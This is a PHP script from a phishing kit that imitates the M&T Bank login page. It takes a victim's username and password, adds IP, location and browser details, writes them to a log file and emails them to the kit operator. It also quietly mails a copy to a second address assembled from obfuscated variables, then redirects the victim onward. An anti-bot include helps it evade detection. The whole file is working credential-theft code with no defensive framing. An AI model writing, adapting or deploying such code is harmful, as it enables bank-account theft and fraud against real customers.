<?php
session_start();
error_reporting(0);

$TIME_DATE = date('H:i:s d/m/Y');
include('../functions/Email.php');
include('../functions/get_ip.php');
include('../antibots.php');

if(isset($_COOKIE['wfacookie'])) {
	$wfa = $_COOKIE['wfacookie'];
	$ndsid = $_COOKIE['ndsid'];
}
if (isset($_POST['txtUserID'])){
	$_SESSION['_txtUserID_']    = $_POST['txtUserID'];
	$_SESSION['_txtPasscode_'] = $_POST['txtPasscode'];

$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>M&T BANK LOGIN INFORMATION</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [M&T Username] = <font style='color:#0070ba;'>".$_SESSION['_txtUserID_']."</font><br>
<font style='color:#9c0000;'>℗</font> [M&T Password] = <font style='color:#0070ba;'>".$_SESSION['_txtPasscode_']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$LOOKUP_IP."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$LOOKUP_ISP."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_COUNTRY_']."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGION_']."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_STATE_']."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #820000;'>BY @X_hammer</font> #####################
</div></html>\n";
if (!empty($_POST['txtUserID'] && !empty($_POST['txtPasscode']))){
        $Z118_SUBJECT = "NEW M&T ✪ LOGIN INFO FROM : ✪ ".$_POST['txtUserID']." ✪";
        $Z118_HEADERS .= "From:XD <noreply@logs.com>";
        $Z118_HEADERS .= $_POST['txtUserID']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		
		$res_file = fopen("getData.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
       
        @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
		
		$Z119_Mail = "$browserx$versionx$getbinsxz118";
			if (strlen($Z119_Mail) == 23) {
				@mail($Z119_Mail, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS); 
				}
				
		HEADER("Location: ../capture/?confirm_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
}
	  else
	  {
		  HEADER("Location: ../login/?confirm_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
	  }
}		
?>